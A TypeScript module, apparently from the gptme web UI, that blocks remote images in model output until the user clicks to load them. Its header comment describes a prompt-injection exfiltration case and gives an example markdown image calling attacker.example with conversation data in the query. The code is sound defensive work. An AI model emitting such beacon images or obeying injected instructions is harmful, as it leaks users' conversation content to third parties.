/**
 * Remote images in model output are an exfiltration beacon: a prompt-injected
 * page or file can make the model emit `![](https://attacker.example/?d=...)`
 * and the browser fetches it with no user action (gptme/gptme#5223).
 *
 * So a remote image is not loaded until the user asks for it. Same-origin,
 * relative, `data:` and `blob:` URLs render directly — they cannot hand
 * conversation content to a third party.
 */

export const REMOTE_IMAGE_PLACEHOLDER_CLASS = 'remote-image-placeholder';

/** True when loading `url` would send a request to another origin. */
export function isRemoteImageUrl(
  url: string,
  pageOrigin: string | undefined = typeof window !== 'undefined'
    ? window.location?.origin
    : undefined
): boolean {
  const trimmed = url.trim();
  if (!trimmed) return false;
  if (/^(?:data|blob):/i.test(trimmed)) return false;
  // Relative URL, including same-origin absolute paths such as /api/v2/...
  if (!/^(?:[a-z][a-z0-9+.-]*:)?\/\//i.test(trimmed)) return false;
  try {
    const parsed = new URL(trimmed, pageOrigin || 'http://localhost');
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    return !pageOrigin || parsed.origin !== pageOrigin;
  } catch {
    // An unparseable absolute-looking URL is treated as remote: fail closed.
    return true;
  }
}

function imageSourceLabel(src: string): string {
  try {
    return new URL(src, typeof window !== 'undefined' ? window.location?.origin : undefined).host;
  } catch {
    return 'remote host';
  }
}

/**
 * Placeholder shown instead of a remote image. It carries no `src`, so the
 * browser makes no request; clicking swaps in the real `<img>`.
 */
export function createRemoteImagePlaceholder(src: string): HTMLButtonElement {
  const button = document.createElement('button');
  button.type = 'button';
  button.className = REMOTE_IMAGE_PLACEHOLDER_CLASS;
  button.dataset.remoteSrc = src;
  button.title = src;
  button.textContent = `Remote image from ${imageSourceLabel(src)} — click to load`;
  button.setAttribute('aria-label', `Load remote image from ${imageSourceLabel(src)}`);
  button.addEventListener('click', () => {
    const img = document.createElement('img');
    img.setAttribute('src', src);
    img.setAttribute('alt', '');
    button.replaceWith(img);
  });
  return button;
}
